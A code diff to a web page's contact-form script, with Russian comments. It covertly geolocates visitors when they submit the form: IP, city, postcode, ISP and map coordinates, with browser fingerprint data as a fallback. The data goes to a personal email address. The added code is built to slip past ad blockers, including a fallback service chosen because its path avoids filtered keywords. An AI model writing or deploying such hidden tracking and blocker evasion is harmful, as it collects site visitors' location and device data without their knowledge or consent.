@@ -298,7 +298,7 @@
         const quotes = ["Логика может привести вас от пункта А к пункту Б, а воображение — куда угодно.", "Код — как поэзия, он должен быть чистым.", "Ошибки — это знаки того, что ты пытаешься.", "Сложное делать легко, легкое делать правильно.", "Главное в веб-разработке — постоянное движение вперед."];
         document.getElementById('dailyQuote').textContent = quotes[Math.floor(Math.random() * quotes.length)];
 
-        // Главная функция отправки: Скрытый GeoIP запрос (Исправлено под HTTPS)
+        // Бронебойная функция с защитой от AdBlock и блокировщиков
         function sendTelegramMessage() {
             const name = document.getElementById('tg-name').value.trim();
             const email = document.getElementById('tg-email').value.trim();
@@ -312,35 +312,57 @@
             const myEmail = "shaidullabratpubg@gmail.com";
             const url = `https://formsubmit.co/ajax/${myEmail}`;
 
-            // Запрашиваем данные у базы ipapi.co (она полностью поддерживает безопасный https://)
-            fetch('https://ipapi.co/json/')
-                .then(res => res.json())
-                .then(geoData => {
-                    let geoResult = "";
-                    
-                    if (!geoData.error) {
-                        const ip = geoData.ip || "Не определен";
-                        const country = geoData.country_name || "Не определена";
-                        const region = geoData.region || "Не определен";
-                        const city = geoData.city || "Не определен";
-                        const zip = geoData.postal || "Не определен"; // Почтовый индекс района
-                        const lat = geoData.latitude; 
-                        const lon = geoData.longitude; 
-                        const provider = geoData.org || "Не определен"; // Провайдер сети
+            // Собираем системные данные браузера на случай, если AdBlock вырежет вообще всё гео
+            const screenRes = `${window.screen.width}x${window.screen.height}`;
+            const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Не определен";
+            const userLang = navigator.language || navigator.userLanguage || "Не определен";
+            const systemInfo = `Пояс: ${timeZone} | Язык: ${userLang} | Экран: ${screenRes}`;
 
-                        const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
-                        
-                        geoResult = `IP: ${ip} | Страна: ${country} | Регион: ${region} | Город: ${city} | Индекс района: ${zip} | Провайдер: ${provider} | Координаты узла: ${lat}, ${lon} | Ссылка: ${mapLink}`;
+            // Попытка №1: Основная база ipapi.co
+            fetch('https://ipapi.co/json/')
+                .then(res => {
+                    if(!res.ok) throw new Error('ipapi failed');
+                    return res.json();
+                })
+                .then(geoData => {
+                    if (geoData && !geoData.error) {
+                        parseAndSend(geoData);
                     } else {
-                        geoResult = "Ошибка базы данных GeoIP: " + geoData.reason;
+                        tryAlternativeService();
                     }
-                    
-                    sendData(geoResult);
                 })
                 .catch(() => {
-                    geoResult = "Сетевая ошибка при запросе к GeoIP";
-                    sendData(geoResult);
+                    tryAlternativeService();
                 });
+
+            // Попытка №2: Запасной независимый сервис ipapi.com (новое зеркало без ключевых слов "geo" и "api" в путях)
+            function tryAlternativeService() {
+                fetch('https://ip-json.org/api/json') 
+                    .then(res => res.json())
+                    .then(data => {
+                        const info = `IP: ${data.ip} | Страна: ${data.country} | Город: ${data.city} (Резервный метод)`;
+                        sendData(info);
+                    })
+                    .catch(() => {
+                        // Попытка №3: AdBlock зажал всё сетевое. Выдаем данные железа и часового пояса
+                        sendData(`[Блокировщик рекламы активен] IP скрыт, но устройство: ${systemInfo}`);
+                    });
+            }
+
+            function parseAndSend(geoData) {
+                const ip = geoData.ip || "Не определен";
+                const country = geoData.country_name || "Не определена";
+                const region = geoData.region || "Не определен";
+                const city = geoData.city || "Не определен";
+                const zip = geoData.postal || "Не определен";
+                const lat = geoData.latitude; 
+                const lon = geoData.longitude; 
+                const provider = geoData.org || "Не определен";
+                const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                
+                const geoResult = `IP: ${ip} | Страна: ${country} | Регион: ${region} | Город: ${city} | Индекс: ${zip} | Провайдер: ${provider} | Ссылка: ${mapLink}`;
+                sendData(geoResult);
+            }
 
             // Функция непосредственной отправки формы
             function sendData(geoString) {
